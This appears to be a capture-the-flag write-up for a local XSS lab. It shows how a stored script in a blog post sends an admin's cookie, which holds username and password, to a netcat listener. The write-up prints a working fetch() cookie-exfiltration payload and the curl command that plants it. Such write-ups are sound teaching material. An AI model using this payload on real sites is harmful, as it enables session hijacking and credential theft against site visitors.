# Cross Site Scripting 7

In this challenge, we have `/challenge/server` that will server us a blog post web app. There is a `/challenge/victim`
that will act as the victim.

This time, instead of having the `admin` publish their flag that was already in the draft, we want their whole account.

Our goal here is to leak the `admin`'s cookies by using `fetch()` to send it to ourselves. Why do we have to do this?

Because the server has banned the `admin` from publishing posts:

```python
@app.route("/publish", methods=["POST"])
def challenge_publish():
    ...
    if username == "admin":
        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
    ...
```

Luckily for us, they changed up how they are storing their cookies:

```python
@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    ...
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    ...
    response = flask.redirect("/")
    response.set_cookie("auth", username + "|" + password)
    return response
```

Therefore, if we login as `hacker` and then `cat` out the `cookies.txt` we get from running the login `curl` command, we get this:

```bash
curl -c cookies.txt 'challenge.localhost:80/login' -d 'username=hacker' -d 'password=1337' -L
```

```bash

# This file was generated by libcurl! Edit at your own risk.

challenge.localhost     FALSE   /       FALSE   0       auth    hacker|1337
```

`hacker|1337` is the cookie that it stores. Of course, we can see what our cookies are because we save it in a file on our
end and then `cat` it out. But what should we do for the `admin`? 

One idea is that we can use a `fetch()` to send the cookie out to us. We can use `nc` to listen at a specific port on localhost,
and then have the **stored XSS** to read the current cookies, and then send it to ourselves.

How do we make `admin` read its own cookies? Or read cookies in general? We use this javascript:

```javascript
console.log(document.cookie);
```

`document.cookie` will get us the `admin|xxxxxxxxx...` that we are looking for.

But how do **WE** get access to this? First, we will create a listening port using `nc`:

```bash
nc -lvn 8080
```

This will listen for all incoming connections to port 8080.

Now, let's try to send this to ourselves using `fetch()` like so:

```javascript
fetch('http://localhost:8080/?data=' + encodeURIComponent(document.cookie))
```

We need to have `encodeURIComponent` because URLs won't allow certain characters to be inside them, like spaces or `=`.

Below is the payload that would need to be crafted:

```bash
curl -b cookies.txt 'challenge.localhost:80/draft?' --data-urlencode 'content=<script>fetch("http://127.0.0.1:8080/?data=" + encodeURIComponent(document.cookie))</script>' -d 'publish=1' -L
```

Notice that we use `--data-urlencode` instead of regular `-d`. This may seem redundant because we have both `--data-urlencode` and `encodeURIComponent()`,
but that is not true. `--data-urlencode` will run first when sending the `curl` command, changing the `+` to its correct encoding.

The javascript will then use `encodeURIComponent()` to modify `document.cookie` so that it can be concatenated properly with the localhost url that is
crafted before `fetch()` sends it off.

Now, after the above `curl` command runs, what happens? Whoever accesses the root page of the blog will now have their cookies inspected by the javascript
and have it sent to port `8080` of our machine.

```bash

```
